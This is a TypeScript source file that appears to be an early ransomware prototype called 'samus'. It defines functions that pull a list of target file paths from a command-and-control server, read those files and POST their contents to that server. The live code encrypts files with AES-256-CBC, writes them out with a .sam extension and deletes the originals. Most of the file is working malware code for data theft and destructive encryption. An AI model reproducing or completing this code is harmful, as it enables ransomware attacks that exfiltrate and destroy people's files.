import { faker } from "@faker-js/faker";
import axios from "axios";
import fs from "node:fs";
import chalk from "chalk";
import {c2} from './c2';
import type { FileDTO, FinalPayload } from "./interfaces/interfaces";
import path from 'path'
import crypto from 'node:crypto'


// const filesToSearchFor = await getFilesToSearchFor()
// const payload: FinalPayload = await createImportantFilesPayload(filesToSearchFor)

// Send Payload to C2
// sendPayload(await payload);

// // Send Payload as often as defined by C2
// setInterval(async () => {
//   sendPayload(await createImportantFilesPayload(filesToSearchFor));
// }, c2.pollFrequency);


// Encrypt all the files after sending
const testFiles: FileDTO[] = [
  {path: path.join(__dirname, 'important-zone', 'test.txt'), content: "test"},
  {path: path.join(__dirname, 'important-zone', 'test2.txt'), content: "test2"},
  {path: path.join(__dirname, 'important-zone', 'test3.txt'), content: "test3"},
  {path: path.join(__dirname, 'important-zone', 'test4.txt'), content: "test4"},
  {path: path.join(__dirname, 'important-zone', 'test5.txt'), content: "test5"},
  {path: path.join(__dirname, 'important-zone', 'test6.txt'), content: "test6"},
  {path: path.join(__dirname, 'important-zone', 'test7.txt'), content: "test7"},
  {path: path.join(__dirname, 'important-zone', 'test8.txt'), content: "test8"},
  {path: path.join(__dirname, 'important-zone', 'test9.txt'), content: "test9"},
  {path: path.join(__dirname, 'important-zone', 'test10.txt'), content: "test10"},
]

const algorithm = 'aes-256-cbc'; // Encryption algorithm
const key = crypto.randomBytes(32); // Generate a random key
const iv = crypto.randomBytes(16); // Generate a random initialization vector

// Save the key and iv for decryption
const decryptionInfo = {
  key: key.toString('hex'),
  iv: iv.toString('hex')
};
fs.writeFileSync('sam.key', JSON.stringify(decryptionInfo));

// Encrypt all the files
testFiles.forEach(encryptFile)



// Modify and add .ta to all filepaths passed in
function encryptFile(file: FileDTO) {
  console.log('Encrypting: ', file.path);

  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encryptedContent = cipher.update(file.content);
  encryptedContent = Buffer.concat([encryptedContent, cipher.final()]);

  // Save the encrypted content to a new file
  const encryptedFilePath = `${file.path}.sam`;
  fs.writeFileSync(encryptedFilePath, encryptedContent);

  // Delete the old file
  fs.unlinkSync(file.path);

  console.log(`File encrypted and saved to: ${encryptedFilePath}`);
}

async function getFilesToSearchFor() : Promise<string[]> {
  const response = await axios.get(`${c2.hostname}/api/tools/samus/important-files`)
  let importantFilePaths = await response.data.importantFilePaths
  console.log(importantFilePaths, 'files to search for!')
  return importantFilePaths
}

// Function to create payload and send HTTP POST request
async function createImportantFilesPayload(importantFilePaths: string[]): Promise<FinalPayload> {
  const fileContentsPromises = importantFilePaths.map(readFileContent);
  const fileContents = await Promise.all(fileContentsPromises);

  // Filter out any files that could not be read
  const filePayloads = fileContents.filter ((fileContent) => fileContent !== null).map((fileContent) => {

    // Return a payload
    return {
      path: fileContent?.path,
      content: fileContent?.content,
    };
  })
  // TODO: Implement getting real IP addrs
  let finalPayload: FinalPayload = {
    ip4: faker.internet.ipv4(),
    ip6: faker.internet.ipv6(),
    files: filePayloads,
  };

//   console.log(finalPayload)
  console.log(chalk.yellowBright("Final Payload Created (above)"));
 
  return finalPayload;
}
// Function to read file contents
async function readFileContent(filePath: string) {
  if (!fs.existsSync(filePath)) {
    console.log("Reading file: ", filePath);
    return null;
  }
  try {
    await fs.promises.access(filePath, fs.constants.F_OK);
    console.log("Reading file: ", filePath);

    const content = await fs.promises.readFile(filePath, "utf-8");
    return { path: filePath, content };
  } catch (error: any) {
    console.log(error);
    if (error.code === "ENOENT") {
      console.warn(`File ${filePath} does not exist. Skipping...`);
      return null;
    } else {
      console.error(`Error reading file ${filePath}:`, error);
      return null;
    }
  }
}

function sendPayload(payload: any) {
  axios.post(`${c2.hostname}/api/lists/important-files`, payload)
    .then((response) => {
      // console.log(response.data);
      console.log(chalk.blueBright.bold( "[200 - POST] IMPORTANT-FILES"));
    })
    .catch((error) => {
      // console.log(error);
      console.log("Errored important-file post");
    });
}
